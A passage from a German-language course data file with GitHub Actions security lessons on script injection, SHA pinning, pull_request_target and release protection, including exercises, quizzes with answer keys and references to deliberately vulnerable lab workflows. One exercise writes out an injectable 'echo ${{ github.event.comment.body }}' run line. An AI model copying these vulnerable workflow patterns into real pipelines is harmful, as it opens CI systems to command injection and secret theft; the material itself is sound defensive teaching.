      'Prüfe die Lösung: Die Ausdruckssyntax steht nur noch im env-Block, nicht im Skript. Die CLI meldet nichts.',
      'Beachte, was die Lösung nicht leistet: Wird der Wert danach an eval, bash -c oder eine andere Auswertung gegeben, entsteht dieselbe Lücke wieder. Die Variable ist Text, und so soll er bleiben.',
      'Alternativ übergib den Wert als Eingabe (with) an eine Action; dann wird kein Shell-Skript erzeugt. Prüfe aber, was die Action damit tut.',
      'Beachte die Grenze des Linters: Er prüft eine feste Liste bekannter Felder zeilenweise. Neue Felder, Ausdrücke über mehrere Zeilen oder Skripte in github-script erkennt er nicht; ergänze ihn dort um Prüfungen mit actionlint oder zizmor.',
    ],
    background: `Warum ist das Problem so alt und so häufig? Weil es bequem ist: Der Ausdruck im Skript funktioniert in allen Tests, nur der Angreifer wählt Sonderzeichen. Das Muster ist dasselbe wie bei SQL-Injection: Daten werden zu Code, wenn man sie ohne Trennung zusammensetzt. Die Gegenmaßnahme ist dieselbe wie dort, die Trennung von Code und Daten.

Wie groß ist der Schaden? Das hängt von den Rechten des Jobs ab. Ein Job mit Lesezugriff und ohne Secrets kann wenig anrichten; ein Job mit Schreibrechten und Secrets kann Code verändern oder Zugangsdaten abgreifen. Deshalb gehören Lektion 3 (enge Rechte) und diese Lektion zusammen: Die zweite Verteidigungslinie begrenzt, was passiert, wenn die erste fehlt.

Zum Stand: Welche Felder von außen steuerbar sind, steht in der offiziellen Dokumentation zur Skript-Einschleusung; die Liste im Lab ist ein Auszug. Neuere Ereignisse und Felder kommen laufend hinzu. Wenn ein Wert nicht von dir stammt, behandle ihn als nicht vertrauenswürdig.`,
    terms: [
      { term: 'Script-Injection', text: 'Von außen gesteuerte Werte werden Teil eines Skripts und dadurch als Befehle ausgeführt.' },
      { term: 'Ausdruck (${{ }})', text: 'Wird von GitHub vor dem Start der Shell ausgewertet und als Text in das Skript eingesetzt.' },
      { term: 'Zwischenvariable (env)', text: 'Der Wert wird als Umgebungsvariable übergeben und in der Shell als Daten gelesen, nicht als Code.' },
      { term: 'nicht vertrauenswürdige Eingabe', text: 'Jeder Wert, den Dritte beeinflussen können, etwa Titel, Branchnamen oder Kommentare.' },
    ],
    code: { file: lab + 'workflows/bad-injection.yml', lang: 'YAML' },
    code2: { file: lab + 'workflows/good-ci.yml', lang: 'YAML', from: 'Titel des Pull Requests ausgeben', to: 'run: echo "Titel: $PR_TITLE"' },
    code3: { file: lab + 'src/lint-workflow.js', lang: 'JavaScript', from: 'const untrusted = [', to: '];' },
    order: ['body', 'code', 'code2', 'code3', 'body2'],
    output: runCli('bad-injection.yml', 'good-ci.yml'),
    mistakes: [
      { wrong: 'Ausdrücke mit Titel, Branchnamen oder Kommentaren direkt in run zu schreiben.', why: 'Der Wert wird Teil des Skripts; Sonderzeichen führen zu fremden Befehlen.', fix: 'Über env übergeben und in der Shell in Anführungszeichen lesen.' },
      { wrong: 'Sich auf „Ich filtere Anführungszeichen“ zu verlassen.', why: 'Es gibt viele Wege, ein Skript zu verlassen; eine Sperrliste ist nie vollständig.', fix: 'Daten und Code grundsätzlich trennen.' },
      { wrong: 'Die Zwischenvariable danach an eval oder bash -c zu geben.', why: 'Damit entsteht dieselbe Lücke erneut.', fix: 'Den Wert nur als Argument verwenden, nie als auszuführenden Text.' },
      { wrong: 'Einen Linter als vollständigen Schutz zu betrachten.', why: 'Die Lab-CLI kennt nur bekannte Felder und Muster.', fix: 'Zusätzlich actionlint oder zizmor einsetzen und Änderungen an Workflows im Review prüfen.' },
    ],
    practice: 'Suche in einem eigenen Projekt nach „${{“ innerhalb von run-Blöcken. Prüfe bei jedem Fund, ob der Wert von außen kommen kann, und stelle bei Bedarf auf env um.',
    exercises: [
      { task: 'Schreibe bad-injection.yml so um, dass der Titel über env übergeben wird.', acceptance: 'Die CLI meldet keine Befunde; du erklärst, warum der Wert in der Shell nicht mehr als Code gelesen wird.' },
      { task: 'Grenzfall: Ein Skript soll den Branchnamen (github.head_ref) in einem Dateinamen verwenden.', acceptance: 'Du übergibst ihn über env, setzt ihn in Anführungszeichen und prüfst oder bereinigst ihn zusätzlich, etwa mit einer Positivliste erlaubter Zeichen.' },
      { task: 'Fehlerfall: Setze in einem Test-Workflow „echo ${{ github.event.comment.body }}“ in ein run-Skript.', acceptance: 'Die CLI meldet script-injection; du behebst es nach dem env-Muster.' },
    ],
    quiz: [
      { q: 'Warum ist ein Ausdruck mit github.event.issue.title in einem run-Skript gefährlich?',
        options: ['Der Titel kann zu lang für die Shell sein.', 'Der Titel wird langsam ausgewertet.', 'Das Feld ist für Workflows gesperrt.', 'Wer den Titel setzt, bestimmt damit den Text des Skripts.'],
        correct: 3,
        rationales: ['Die Länge ist nicht das Problem.', 'Die Geschwindigkeit spielt keine Rolle.', 'Das Feld ist lesbar und häufig im Einsatz.', 'GitHub setzt den Wert vor dem Lauf als Text in das Skript ein.'],
        explain: 'Dadurch können Sonderzeichen im Titel weitere Befehle einschleusen.' },
      { q: 'Welche Lösung empfiehlt die Dokumentation für Skripte?',
        options: ['Den Wert in eine Zwischenvariable (env) legen und dort lesen.', 'Den Titel in Kleinbuchstaben umwandeln.', 'Das Skript in eine zweite Datei auslagern.', 'Leerzeichen im Titel entfernen.'],
        correct: 0,
        rationales: ['So wird der Wert zu Daten, nicht zu Code.', 'Das ändert die Sonderzeichen nicht.', 'Das löst das Einsetzen des Werts nicht.', 'Andere Sonderzeichen genügen für einen Angriff.'],
        explain: 'Die Zwischenvariable trennt Code und Daten; in der Shell wird sie in Anführungszeichen gelesen.' },
      { q: 'Welche Aussage über die Lab-CLI ist richtig?',
        options: ['Sie findet jede mögliche Script-Injection in jedem Workflow.', 'Sie ersetzt das Prüfen der Änderungen im Review vollständig.', 'Sie prüft bekannte Felder zeilenweise und kann Fälle übersehen.', 'Sie führt die Workflows zur Probe bei GitHub aus.'],
        correct: 2,
        rationales: ['Sie kennt nur bekannte Muster.', 'Ein Linter ergänzt das Review, er ersetzt es nicht.', 'Neue Felder und mehrzeilige Ausdrücke erkennt sie nicht.', 'Sie liest nur den Text der Datei.'],
        explain: 'Verwende zusätzlich Werkzeuge wie actionlint oder zizmor und ein sorgfältiges Review.' },
    ],
    sources: [
      gh('Script-Injection verstehen', 'https://docs.github.com/en/actions/concepts/security/script-injections'),
      gh('Sichere Verwendung von Actions (Zwischenvariable)', 'https://docs.github.com/en/actions/reference/security/secure-use'),
    ],
    verification: verification('das Muster mit Titel im Skript (Befund) und die sichere Variante über env (kein Befund) sowie die Tests der Regel mit mehreren Feldern und Mutationsproben.', 'die tatsächliche Ausnutzung bei GitHub; das Lab führt keine Workflows aus und prüft nur den Text.'),
  },
  {
    id: 'ci-m1-l5', title: 'Lieferkette: Actions festlegen, pull_request_target und Fremdcode', minutes: 35,
    prerequisites,
    objectives: [
      'Erklären, warum Tags wie @v2 oder @main nicht unveränderlich sind und was eine SHA-Festlegung bringt',
      'Das Workflow-Lockfile und Dependabot für Actions einordnen',
      'Das Risiko von pull_request_target mit Checkout des Pull-Request-Codes beschreiben',
      'Befunde der Lab-CLI zu unpinned-action und pull-request-target-checkout beheben',
    ],
    simple: `Eine Action ist fremder Code, der in deinem Workflow mit Zugriff auf dein Token und deine Secrets läuft. Mit uses: besitzer/name@v2 sagst du: „nimm, worauf v2 gerade zeigt“. Tags und Branches kann der Besitzer verschieben, auch ein Angreifer, der sein Konto übernommen hat. Dann läuft bei deinem nächsten Lauf anderer Code, ohne dass sich dein Workflow geändert hat.

Eine feste Version bekommst du über die vollständige Commit-SHA (40 Zeichen): uses: besitzer/name@<sha> # v2.1.0. Ein Commit lässt sich nicht verschieben. Neuer ist das Workflow-Lockfile, das alle Actions samt Unterabhängigkeiten auf geprüfte Commits festlegt; laut Dokumentation ist es der stärkste Schutz und ersetzt das manuelle Festlegen, wo es eingesetzt wird. Dependabot kann Versionen von Actions aktualisieren, damit Festlegungen nicht veralten.

Ein eigener Fall ist pull_request_target. Dieses Ereignis läuft im Kontext des Zielrepositories mit Schreibrechten und Secrets. Checkt der Workflow dort den Code des Pull Requests aus und führt ihn aus (zum Beispiel npm ci), führt er Fremdcode mit diesen Rechten aus.`,
    steps: [
      'Öffne workflows/bad-unpinned.yml und starte „node src/cli.js workflows/bad-unpinned.yml“. Die CLI meldet zwei Actions von Dritten ohne SHA: someone/deploy-action@v2 und another/tool@main.',
      'Beachte die Ausnahmen der Lab-CLI: Actions von actions/ und github/ sowie lokale Actions (./…) werden nicht gemeldet. Das ist eine Entscheidung des Labs; die strengste Variante legt alle fest.',
      'Behebe die Befunde: Suche im Repository der Action den Commit zur gewünschten Version, prüfe, dass er aus dem Original-Repository stammt (nicht aus einem Fork), und trage die 40 Zeichen ein, mit einem Kommentar zur Version.',
      'Prüfe mit „node src/cli.js workflows/bad-pwn-request.yml“ den zweiten Fall: Ein Workflow mit pull_request_target checkt ref: ${{ github.event.pull_request.head.sha }} aus. Die CLI meldet pull-request-target-checkout.',
      'Behebe ihn: Nutze für Tests von Pull Requests das Ereignis pull_request (mit eingeschränktem Token, ohne Secrets). Wenn ein Schritt wirklich Schreibrechte braucht, trenne ihn: erst ein Workflow ohne Rechte, der baut oder testet, dann ein zweiter, der nur das Ergebnis (nicht den Code) prüft und weiterverarbeitet.',
      'Richte für Festlegungen eine Pflege ein: entweder das Lockfile oder Dependabot (package-ecosystem: github-actions), damit gepinnte Versionen nicht veralten.',
      'Prüfe, ob in deinem Repository die Einstellungen für Actions zu streng oder zu lose sind (erlaubte Actions, Genehmigung für Fork-Pull-Requests von Erstbeitragenden). Das ist eine Einstellung im Repository, keine Datei.',
    ],
    background: `Wie real ist das Risiko? Es gab mehrfach Vorfälle, bei denen eine beliebte Action manipuliert wurde und Secrets vieler Projekte abgeflossen sind. Die Ursache war immer dieselbe: Ein beweglicher Verweis (Tag) zeigte plötzlich auf anderen Code. Eine SHA-Festlegung verhindert das für die direkt genannte Action; Unterabhängigkeiten einer zusammengesetzten Action deckt das Lockfile besser ab.

Der Preis der Festlegung ist Pflege: Wer SHA festlegt und nie aktualisiert, bekommt keine Sicherheitskorrekturen. Deshalb gehört ein Verfahren dazu (Dependabot oder regelmäßiger Check), und im Review prüft jemand, was die neue Version ändert.

Zum Stand: Das Lockfile ist eine neuere Funktion von GitHub (Dokumentation bei der Erstellung gelesen); ich habe es in diesem Lab nicht ausprobiert, sondern die Beschreibung der Dokumentation wiedergegeben. Prüfe vor dem Einsatz die aktuellen Voraussetzungen und Grenzen (etwa: Aufrufe wiederverwendbarer Workflows werden nicht erfasst und müssen selbst per SHA festgelegt werden). Die Liste der Ausnahmen der Lab-CLI (eigene Actions von GitHub) ist eine Vereinfachung, kein Sicherheitsurteil.`,
    terms: [
      { term: 'Commit-SHA', text: 'Eindeutiger 40-stelliger Hash eines Commits; im Gegensatz zu einem Tag nicht verschiebbar.' },
      { term: 'Workflow-Lockfile', text: 'Datei, die alle Actions eines Repositories auf geprüfte Commits festlegt (.github/workflows/actions.lock).' },
      { term: 'pull_request_target', text: 'Ereignis, das im Kontext des Zielrepositories läuft, mit Schreibrechten und Secrets.' },
      { term: 'Lieferkette', text: 'Alles Fremde, auf das dein Build vertraut: Actions, Pakete, Basisimages und Werkzeuge.' },
    ],
    code: { file: lab + 'workflows/bad-unpinned.yml', lang: 'YAML', from: 'steps:', to: '- run: ./deploy.sh' },
    code2: { file: lab + 'workflows/bad-pwn-request.yml', lang: 'YAML', from: 'on:', to: '- run: npm ci' },
    code3: { file: lab + 'src/lint-workflow.js', lang: 'JavaScript', from: 'const isSha', to: 'const firstParty' },
    order: ['body', 'code', 'code2', 'code3', 'body2'],
    output: runCli('bad-unpinned.yml', 'bad-pwn-request.yml'),
    mistakes: [
      { wrong: 'Fremde Actions mit @main oder @v1 einzubinden.', why: 'Der Verweis kann auf neuen, auch bösartigen Code zeigen, ohne dass sich dein Workflow ändert.', fix: 'Auf die Commit-SHA festlegen (mit Versionskommentar) oder das Lockfile nutzen.' },
      { wrong: 'Eine SHA festzulegen und nie zu aktualisieren.', why: 'Sicherheitskorrekturen kommen nicht an, und der Workflow veraltet.', fix: 'Dependabot für github-actions oder einen regelmäßigen Check einrichten.' },
      { wrong: 'Bei pull_request_target den Code des Pull Requests auszuchecken und auszuführen.', why: 'Fremdcode läuft mit Schreibrechten und Secrets des Zielrepositories.', fix: 'Für Tests pull_request verwenden; Schreibschritte vom Fremdcode trennen.' },
      { wrong: 'Eine SHA aus einem Fork zu übernehmen.', why: 'Ein Commit aus einem Fork lässt sich unter dem Namen des Original-Repositories auflösen, obwohl er dort nie geprüft wurde.', fix: 'Prüfen, dass die SHA im Repository der Action steht.' },
    ],
    practice: 'Liste für ein eigenes Projekt alle uses-Zeilen auf. Markiere jede Action, die nicht von GitHub stammt, und lege sie auf eine SHA fest. Richte danach eine Pflege der Versionen ein.',
    exercises: [
      { task: 'Ersetze in bad-unpinned.yml die beiden Verweise durch Platzhalter mit 40-stelliger SHA (zum Beispiel 40 mal „a“ als Übung) und einem Kommentar.', acceptance: 'Die CLI meldet keine Befunde; du erklärst, dass die Übung nur das Format prüft und dass echte SHAs aus dem jeweiligen Repository stammen müssen.' },
      { task: 'Grenzfall: Ein Workflow mit pull_request_target soll nur ein Label setzen und den Code nicht ausführen.', acceptance: 'Du entfernst den Checkout des Pull-Request-Codes; die CLI meldet keinen Befund; du begründest, warum das Setzen des Labels ohne Fremdcode sicher ist.' },
      { task: 'Fehlerfall: Ersetze in bad-pwn-request.yml das Ereignis durch pull_request und entferne die Angabe von ref.', acceptance: 'Die CLI meldet keinen Befund; du erklärst, dass der Lauf nun nur Leserechte hat und keine Secrets erhält.' },
    ],
    quiz: [
      { q: 'Warum ist uses: besitzer/name@v2 weniger sicher als eine Festlegung auf eine SHA?',
        options: ['Der Tag v2 kann auf einen anderen Commit verschoben werden.', 'Tags funktionieren nur bei privaten Repositories.', 'Die SHA wird schneller heruntergeladen.', 'Tags sind für Actions nicht erlaubt.'],
        correct: 0,
        rationales: ['Dann läuft anderer Code, ohne dass sich der Workflow geändert hat.', 'Tags funktionieren überall.', 'Die Geschwindigkeit ist nicht der Grund.', 'Tags sind erlaubt, nur nicht unveränderlich.'],
        explain: 'Ein Commit mit seiner SHA kann nicht verschoben werden, ein Tag schon.' },
      { q: 'Was macht pull_request_target mit Checkout des Pull-Request-Codes gefährlich?',
        options: ['Der Lauf ist zu langsam.', 'Fremdcode läuft mit Schreibrechten und Secrets des Zielrepositories.', 'Der Code wird nicht geprüft.', 'Der Workflow startet doppelt.'],
        correct: 1,
        rationales: ['Die Dauer ist nicht das Problem.', 'Das Ereignis läuft im Kontext des Zielrepositories, der Code stammt aber von außen.', 'Die Prüfung ist unabhängig davon.', 'Die Zahl der Starts hat damit nichts zu tun.'],
        explain: 'Verwende für Tests pull_request mit eingeschränkten Rechten und trenne Schreibschritte vom Fremdcode.' },
      { q: 'Wofür ist Dependabot im Zusammenhang mit festgelegten Actions nützlich?',
        options: ['Es führt die Tests aus.', 'Es verschlüsselt die Secrets.', 'Es ersetzt die Prüfung von Pull Requests.', 'Es schlägt Aktualisierungen der festgelegten Versionen vor.'],
        correct: 3,
        rationales: ['Tests führen Workflows aus.', 'Secrets verwaltet GitHub getrennt.', 'Vorgeschlagene Änderungen müssen weiter geprüft werden.', 'So veralten Festlegungen nicht und Korrekturen kommen an.'],
        explain: 'Festlegen und Pflegen gehören zusammen; Dependabot kann Versionen von github-actions aktualisieren.' },
    ],
    sources: [
      gh('Sichere Verwendung von Actions (Festlegen auf SHA)', 'https://docs.github.com/en/actions/reference/security/secure-use'),
      gh('Workflow-Lockfiles', 'https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles'),
      gh('Actions mit Dependabot aktuell halten', 'https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot'),
      { title: 'GitHub Security Lab: Preventing pwn requests', url: 'https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/', note: 'Hintergrund zu pull_request_target; Inhalt hier eigenständig zusammengefasst.' },
    ],
    verification: verification('die Befunde für nicht festgelegte Actions und für pull_request_target mit Checkout des Pull-Request-Codes sowie die Grenzfälle (SHA mit 39 Zeichen, lokale Actions).', 'das Workflow-Lockfile (nur aus der Dokumentation beschrieben, nicht ausprobiert), Dependabot-Läufe und das Verhalten bei echten Fork-Pull-Requests.'),
  },
  {
    id: 'ci-m1-l6', title: 'Release und Freigabe: Umgebungen, Reihenfolge und kurzlebige Zugangsdaten', minutes: 35,
    prerequisites,
    objectives: [
      'Einen Release-Workflow in Prüfung (verify) und Veröffentlichung (release) trennen',
      'Umgebungen (environments) mit Freigabe einsetzen und die Rolle von concurrency erklären',
      'Kurzlebige Anmeldung über OIDC von langlebigen Secrets unterscheiden',
      'Den Linter und seine Tests als Qualitätstor für Workflows einsetzen',
    ],
    simple: `Ein Release ist der riskanteste Teil der Pipeline: Er verändert etwas, das Nutzer sehen. Darum gelten strengere Regeln als für Tests.

Trenne Prüfung und Veröffentlichung in zwei Jobs: verify führt Tests aus, release läuft erst danach (needs: verify). So wird nur veröffentlicht, was grün war. Dem zweiten Job gibst du nur dann Schreibrechte, wenn er sie braucht (Lektion 3).

Eine Umgebung (environment) wie production kann Schutzregeln haben: eine Freigabe durch bestimmte Personen, eine Wartezeit, erlaubte Branches. Der Job pausiert dann, bis jemand freigibt. Secrets der Umgebung stehen erst nach der Freigabe bereit. Mit concurrency und cancel-in-progress: false laufen Releases nacheinander und werden nie halb abgebrochen.`,
    steps: [
      'Öffne workflows/release.yml. Der Auslöser sind Tags der Form v*. Die oberste Ebene hat nur contents: read; der Job release erhält zusätzlich contents: write.',
      'Der Job release hat needs: verify und environment: production. Er startet nur, wenn verify grün war und die Umgebung freigegeben wurde.',
      'Der Block concurrency mit group: release und cancel-in-progress: false sorgt dafür, dass zwei Tags nacheinander veröffentlicht werden und ein laufender Vorgang nicht abbricht.',
      'Starte „node src/cli.js workflows/release.yml“: keine Befunde. Das Beispiel enthält nur einen Platzhalter-Schritt; ein echtes Ziel (Registry, Server) ist nicht Teil des Labs.',
      'Wenn der Release in eine Cloud oder bei einem Dienst anmeldet, bevorzuge OIDC: Mit permissions: id-token: write erhält der Job ein kurzlebiges Token, dem die Gegenseite anhand von Angaben wie Repository und Branch vertraut. Es gibt dann kein dauerhaftes Passwort, das abfließen kann.',
      'Starte die Tests des Labs mit „npm test“ im Ordner ci-lab: Sie prüfen jede Regel mit guten und schlechten Beispielen und den echten Workflow des Repositories. Nimm den Linter als Schritt in die CI auf, damit neue Workflows geprüft werden.',
      'Dokumentiere den Rückweg: Wie nimmst du einen fehlerhaften Release zurück (neuer Tag mit früherem Stand, Rücknahme beim Ziel)? Plane das, bevor du es brauchst.',
    ],
    background: `Warum die Freigabe? Sie ist eine zweite Person oder zweite Entscheidung vor einer folgenreichen Handlung. Sie schützt vor Versehen (falscher Tag) und vor Missbrauch (ein übernommenes Konto kann nicht allein veröffentlichen). Je nach Tarif von GitHub gibt es unterschiedliche Funktionen für private Repositories; prüfe die Voraussetzungen in der Dokumentation zu Umgebungen.

Warum OIDC statt Secret? Ein dauerhaftes Passwort im Repository kann abfließen und bleibt bis zum Widerruf gültig. Ein OIDC-Token gilt kurz, ist an den Lauf gebunden, und die Gegenseite kann es auf Repository, Branch und Umgebung beschränken. Es ersetzt allerdings nicht die Rechtebegrenzung auf der Gegenseite: Auch das Ziel braucht enge Rechte.

Zum Stand: Das Lab prüft Texte, keine Läufe. Dass die Freigabe funktioniert, dass needs die Reihenfolge erzwingt und dass OIDC bei deinem Anbieter eingerichtet ist, ließ sich hier nicht beobachten und ist bei GitHub und beim Anbieter selbst zu testen, am besten zuerst mit einer harmlosen Umgebung.`,
    terms: [
      { term: 'Umgebung (environment)', text: 'Benannte Zielumgebung (zum Beispiel production) mit Schutzregeln wie Freigabe und eigenen Secrets.' },
      { term: 'needs', text: 'Legt fest, dass ein Job erst startet, wenn ein anderer erfolgreich war.' },
      { term: 'OIDC', text: 'Anmeldung mit einem kurzlebigen, vom Lauf ausgestellten Token statt einem dauerhaften Passwort.' },
      { term: 'Rückweg (Rollback)', text: 'Geplanter Weg, einen fehlerhaften Release zurückzunehmen.' },
    ],
    code: { file: lab + 'workflows/release.yml', lang: 'YAML', from: 'concurrency:', to: '- run: npm test' },
    code2: { file: lab + 'workflows/release.yml', lang: 'YAML', from: 'release:', to: 'würde veröffentlicht' },
    code3: { file: lab + 'tests/lint.test.js', lang: 'JavaScript', from: 'Das gute Beispiel und das Release-Beispiel', to: 'assert.deepEqual(lintWorkflow(load(\'release.yml\')), []);' },
    order: ['body', 'code', 'code2', 'code3', 'body2'],
    output: `${runCli('release.yml')}\n\n${specOutput()}`,
    mistakes: [
      { wrong: 'Tests und Veröffentlichung in einem Job ohne klare Reihenfolge zu mischen.', why: 'Ein Fehler in der Mitte kann einen halb veröffentlichten Stand hinterlassen.', fix: 'Zwei Jobs mit needs: verify und Veröffentlichung nur nach grünem Ergebnis.' },
      { wrong: 'Releases ohne Freigabe oder Schutzregeln der Umgebung auszulösen.', why: 'Ein Versehen oder ein übernommenes Konto kann sofort veröffentlichen.', fix: 'Umgebung mit Freigabe und erlaubten Branches einrichten.' },
      { wrong: 'cancel-in-progress: true bei Releases.', why: 'Ein neuer Tag bricht einen laufenden Vorgang ab und hinterlässt einen unfertigen Zustand.', fix: 'cancel-in-progress: false und eine eigene concurrency-Gruppe.' },
      { wrong: 'Dauerhafte Cloud-Passwörter als Secret zu hinterlegen, wo OIDC möglich ist.', why: 'Sie können abfließen und bleiben bis zum Widerruf gültig.', fix: 'OIDC mit id-token: write und enge Rechte beim Ziel.' },
    ],
    practice: 'Skizziere für ein eigenes Projekt die Release-Kette: Auslöser, Prüfung, Freigabe, Veröffentlichung, Rückweg. Prüfe die Datei mit der Lab-CLI und lege fest, wer freigeben darf.',
    exercises: [
      { task: 'Ergänze in release.yml einen dritten Job notify, der erst nach release läuft und nur Lesezugriff hat.', acceptance: 'Die CLI meldet keine Befunde; du begründest die Rechte des neuen Jobs und seine Stellung in needs.' },
      { task: 'Grenzfall: Zwei Tags werden kurz nacheinander gepusht.', acceptance: 'Du beschreibst mit der Gruppe release und cancel-in-progress: false, dass der zweite Lauf wartet und der erste nicht abbricht.' },
      { task: 'Fehlerfall: Entferne timeout-minutes aus dem Job release und starte die CLI.', acceptance: 'Die Warnung missing-timeout erscheint; du stellst das Limit wieder her.' },
    ],
    quiz: [
      { q: 'Wozu dient needs: verify im Job release?',
        options: ['Es kopiert die Dateien von verify nach release.', 'Es legt fest, dass release nur nach erfolgreichem verify startet.', 'Es gibt dem Job Schreibrechte.', 'Es führt beide Jobs auf demselben Runner aus.'],
        correct: 1,
        rationales: ['Dateien müssten über Artefakte weitergegeben werden.', 'So wird nur veröffentlicht, was geprüft und grün war.', 'Rechte werden mit permissions gesetzt.', 'Jeder Job hat einen eigenen Runner.'],
        explain: 'needs ordnet Jobs; ein fehlgeschlagener verify-Job verhindert die Veröffentlichung.' },
      { q: 'Was bringt eine Umgebung wie production mit Freigabe?',
        options: ['Der Job läuft schneller.', 'Der Job braucht keine Rechte mehr.', 'Der Job startet erst, nachdem eine berechtigte Person freigegeben hat.', 'Der Job wird nie abgebrochen.'],
        correct: 2,
        rationales: ['Die Freigabe verzögert den Start eher.', 'Rechte werden weiterhin mit permissions begrenzt.', 'Das ist eine zweite Entscheidung vor einer folgenreichen Handlung.', 'Das regelt concurrency, nicht die Umgebung.'],
        explain: 'Die Freigabe schützt vor Versehen und Missbrauch; Secrets der Umgebung stehen erst danach bereit.' },
      { q: 'Warum ist OIDC meist besser als ein dauerhaftes Passwort als Secret?',
        options: ['Es ist kürzer zu tippen.', 'Es macht Tests überflüssig.', 'Es funktioniert ohne Internet.', 'Das Token gilt nur kurz und ist an den Lauf gebunden.'],
        correct: 3,
        rationales: ['Die Länge ist nicht der Grund.', 'Tests bleiben nötig.', 'Die Anmeldung braucht eine Verbindung.', 'Es gibt kein dauerhaftes Passwort, das abfließen kann.'],
        explain: 'Zusätzlich kann die Gegenseite die Anmeldung auf Repository, Branch oder Umgebung beschränken.' },
    ],
    sources: [
      gh('Umgebungen verwalten', 'https://docs.github.com/en/actions/how-tos/deploy/configure-and-manage-deployments/manage-environments'),
      gh('OpenID Connect', 'https://docs.github.com/en/actions/concepts/security/openid-connect'),
      gh('Gleichzeitige Läufe steuern (concurrency)', 'https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency'),
    ],
    verification: verification('das Release-Beispiel (ohne Befunde) und die 15 Tests des Linters inklusive Mutationsproben der Regeln.', 'Freigabe, needs-Reihenfolge, concurrency und OIDC in echten GitHub-Läufen und bei einem echten Veröffentlichungsziel.'),
  },
];
